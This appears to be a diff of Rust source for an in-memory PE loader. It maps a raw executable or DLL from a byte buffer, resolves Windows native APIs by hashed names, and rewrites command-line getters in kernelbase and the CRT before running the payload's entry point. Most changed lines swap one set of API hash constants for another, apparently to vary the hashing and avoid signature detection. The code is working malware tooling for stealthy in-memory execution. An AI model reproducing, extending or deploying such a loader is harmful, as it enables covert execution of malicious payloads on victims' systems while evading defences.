@@ -2,19 +2,20 @@ use anyhow::Result;
 use std::ffi::CStr;
 use std::ffi::c_void;
 use std::mem::{size_of, transmute};
-use std::ptr::null_mut;
 use winapi::shared::ntdef::{ANSI_STRING, UNICODE_STRING};
 use winapi::um::winnt::*;
 
 use crate::helper::{ProcessParametersStore, fix_args, restore_args};
-use crate::walker::{get_export_by_hash, get_module_base_by_hash};
+use crate::walker::{get_export, get_module_base};
 
 pub fn load(raw_data: Vec<u8>, target_args: Vec<String>) -> Result<()> {
     unsafe {
         let raw_ptr = raw_data.as_ptr() as *mut u8;
-        let ntdll = get_module_base_by_hash(0x1edab0ed);
-        let nt_alloc_addr = get_export_by_hash(ntdll, 0xf783b8ec).unwrap();
-        let nt_protect_addr = get_export_by_hash(ntdll, 0x50e92888).unwrap();
+
+        let ntdll = get_module_base(0x55c55c01);
+        let nt_alloc_addr = get_export(ntdll, 0x6511db12).unwrap();
+        let nt_protect_addr = get_export(ntdll, 0xf77a57fe).unwrap();
+
         let nt_allocate_virtual_memory: extern "system" fn(
             HANDLE,
             *mut *mut c_void,
@@ -30,6 +31,7 @@ pub fn load(raw_data: Vec<u8>, target_args: Vec<String>) -> Result<()> {
             u32,
             *mut u32,
         ) -> i32 = transmute(nt_protect_addr);
+
         let dos = raw_ptr as *mut IMAGE_DOS_HEADER;
         let nt = raw_ptr.add((*dos).e_lfanew as usize) as *mut IMAGE_NT_HEADERS64;
         let mut image_base: *mut c_void = std::ptr::null_mut();
@@ -62,14 +64,15 @@ pub fn load(raw_data: Vec<u8>, target_args: Vec<String>) -> Result<()> {
         fix_args(&mut arg_store, c_full_payload.as_ptr());
         protect(image_base, nt_protect_virtual_memory);
         let entry_ptr = (image_base as usize + (*nt).OptionalHeader.AddressOfEntryPoint as usize)
-            as *const c_void;
+            as *mut winapi::ctypes::c_void;
         if ((*nt).FileHeader.Characteristics & 0x2000) != 0 {
             let dll_main: extern "system" fn(*mut c_void, u32, *mut c_void) -> i32 =
                 transmute(entry_ptr);
             dll_main(image_base, 1, std::ptr::null_mut());
         } else {
             let exe_main: extern "C" fn(i32, *mut *mut i8) = transmute(entry_ptr);
-            exe_main(1, null_mut());
+            exe_main(1, std::ptr::null_mut());
+            std::thread::sleep(std::time::Duration::from_millis(1000));
         }
         restore_args(&mut arg_store);
         Ok(())
@@ -193,9 +196,9 @@ fn get(nt_header: *mut IMAGE_NT_HEADERS64) -> *mut IMAGE_SECTION_HEADER {
 
 fn resolve(base_address: *mut u8) -> Result<()> {
     unsafe {
-        let ntdll = get_module_base_by_hash(0x1edab0ed);
-        let ldr_load_dll_addr = get_export_by_hash(ntdll, 0x9e456a43);
-        let ldr_get_proc_addr = get_export_by_hash(ntdll, 0xfce76bb6);
+        let ntdll = get_module_base(0x55c55c01);
+        let ldr_load_dll_addr = get_export(ntdll, 0xd2a82257);
+        let ldr_get_proc_addr = get_export(ntdll, 0x39890838);
         let ldr_load_dll: extern "system" fn(
             *mut u16,
             *mut u32,
@@ -272,8 +275,8 @@ fn resolve(base_address: *mut u8) -> Result<()> {
 
 fn update(args: Vec<String>) -> Result<()> {
     unsafe {
-        let ntdll = get_module_base_by_hash(0x1edab0ed);
-        let nt_query_addr = get_export_by_hash(ntdll, 0x8cdc5dc2).unwrap();
+        let ntdll = get_module_base(0x55c55c01);
+        let nt_query_addr = get_export(ntdll, 0xc5d239e2).unwrap();
         let nt_query_info: extern "system" fn(HANDLE, u32, *mut c_void, u32, *mut u32) -> i32 =
             transmute(nt_query_addr);
         let mut pbi = std::mem::zeroed::<ntapi::ntpsapi::PROCESS_BASIC_INFORMATION>();
@@ -301,7 +304,7 @@ fn update(args: Vec<String>) -> Result<()> {
             *mut usize,
             u32,
             u32,
-        ) -> i32 = transmute(get_export_by_hash(ntdll, 0xf783b8ec).unwrap());
+        ) -> i32 = transmute(get_export(ntdll, 0x6511db12).unwrap());
         nt_alloc(
             -1isize as HANDLE,
             &mut new_buffer,
@@ -349,7 +352,7 @@ fn force_update(args: Vec<String>) -> Result<(*mut u16, *mut i8)> {
             .chain(std::iter::once(0))
             .collect();
         let ansi_cmd = format!("{}\0", cmd_line_plain);
-        let ntdll = get_module_base_by_hash(0x1edab0ed);
+        let ntdll = get_module_base(0x55c55c01);
         let nt_alloc: extern "system" fn(
             HANDLE,
             *mut *mut c_void,
@@ -357,7 +360,7 @@ fn force_update(args: Vec<String>) -> Result<(*mut u16, *mut i8)> {
             *mut usize,
             u32,
             u32,
-        ) -> i32 = transmute(get_export_by_hash(ntdll, 0xf783b8ec).unwrap());
+        ) -> i32 = transmute(get_export(ntdll, 0x6511db12).unwrap());
         let mut new_u16: *mut c_void = std::ptr::null_mut();
         let mut size_u16 = utf16_cmd.len() * 2;
         nt_alloc(
@@ -380,8 +383,7 @@ fn force_update(args: Vec<String>) -> Result<(*mut u16, *mut i8)> {
             PAGE_READWRITE,
         );
         std::ptr::copy_nonoverlapping(ansi_cmd.as_ptr(), new_a as *mut u8, ansi_cmd.len());
-        let kernelbase = get_module_base_by_hash(0x3ebb38b);
-        let nt_protect_addr = get_export_by_hash(ntdll, 0x50e92888).unwrap();
+        let nt_protect_addr = get_export(ntdll, 0xf77a57fe).unwrap();
         let nt_protect: extern "system" fn(
             HANDLE,
             *mut *mut c_void,
@@ -389,32 +391,26 @@ fn force_update(args: Vec<String>) -> Result<(*mut u16, *mut i8)> {
             u32,
             *mut u32,
         ) -> i32 = transmute(nt_protect_addr);
-        if let Some(func_w) = get_export_by_hash(kernelbase, 0x32794b03) {
-            apply(func_w as *mut u8, new_u16, nt_protect);
-        }
-        if let Some(func_a) = get_export_by_hash(kernelbase, 0x32794aed) {
-            apply(func_a as *mut u8, new_a, nt_protect);
-        }
-        let kernelbase = get_module_base_by_hash(0x3ebb38b);
+        let kernelbase = get_module_base(0xa70d246b);
         if !kernelbase.is_null() {
-            if let Some(func_w) = get_export_by_hash(kernelbase, 0x32794b03) {
+            if let Some(func_w) = get_export(kernelbase, 0x4d925d3d) {
                 apply(func_w as *mut u8, new_u16, nt_protect);
             }
-            if let Some(func_a) = get_export_by_hash(kernelbase, 0x32794aed) {
+            if let Some(func_a) = get_export(kernelbase, 0x4d925d2b) {
                 apply(func_a as *mut u8, new_a, nt_protect);
             }
         }
-        let crt_base = get_module_base_by_hash(0x40054168);
+        let crt_base = get_module_base(0x4744e800);
         if !crt_base.is_null() {
-            let exports = [0x10f905d5, 0x54693fbe, 0x5cc35eb6, 0x2971e0e0];
+            let exports = [0xa8ef8735, 0xbe177863, 0xb9251f00, 0x34317dcd];
             for &exp_hash in exports.iter() {
-                if let Some(func_ptr) = get_export_by_hash(crt_base, exp_hash) {
+                if let Some(func_ptr) = get_export(crt_base, exp_hash) {
                     match exp_hash {
-                        0x10f905d5 | 0x54693fbe => {
+                        0xa8ef8735 | 0xbe177863 => {
                             let get_ptr: extern "C" fn() -> *mut *mut c_void = transmute(func_ptr);
                             let ptr_to_str = get_ptr();
                             if !ptr_to_str.is_null() {
-                                let replacement = if exp_hash == 0x10f905d5 {
+                                let replacement = if exp_hash == 0xa8ef8735 {
                                     new_u16
                                 } else {
                                     new_a
@@ -422,9 +418,9 @@ fn force_update(args: Vec<String>) -> Result<(*mut u16, *mut i8)> {
                                 *ptr_to_str = replacement;
                             }
                         }
-                        0x5cc35eb6 | 0x2971e0e0 => {
+                        0xb9251f00 | 0x34317dcd => {
                             let global_ptr = func_ptr as *mut *mut c_void;
-                            let replacement = if exp_hash == 0x5cc35eb6 {
+                            let replacement = if exp_hash == 0xb9251f00 {
                                 new_u16
                             } else {
                                 new_a
